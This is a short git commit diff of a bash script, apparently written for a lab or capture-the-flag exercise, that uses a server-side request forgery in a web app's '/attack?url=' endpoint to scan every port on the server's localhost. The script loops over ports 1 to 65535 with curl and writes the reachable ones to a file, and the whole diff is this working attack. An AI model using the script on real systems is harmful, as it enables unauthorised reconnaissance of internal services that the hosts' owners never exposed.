25a0d01a75880a03dfaadcc1f54c44c104f542e2
root <root@ip-10-10-103-89.eu-west-1.compute.internal>
2021-08-01 13:27:58 +0100

    save to file

--- potential-tribble/portche.sh
+++ potential-tribble/portche.sh
@@ -1,9 +1,13 @@
 #!/bin/bash
 
-varibl=22;
-while [ "$varibl" -ne 65535 ] 
+varibl=1;
+file="hello_ports.txt"
+
+rm $file;
+
+while [ "$varibl" -le 65535 ]
 do
 	echo $varibl
-	curl -s "http://10.10.86.232:8000/attack?url=http://user@127.0.0.1:$varibl" | grep 'Target is reachable!';
+	curl -s "http://10.10.51.41:8000/attack?url=http://user@127.0.0.1:$varibl" | grep 'Target is reachable!' && echo $varibl >> $file
 (("varibl++"))
 done
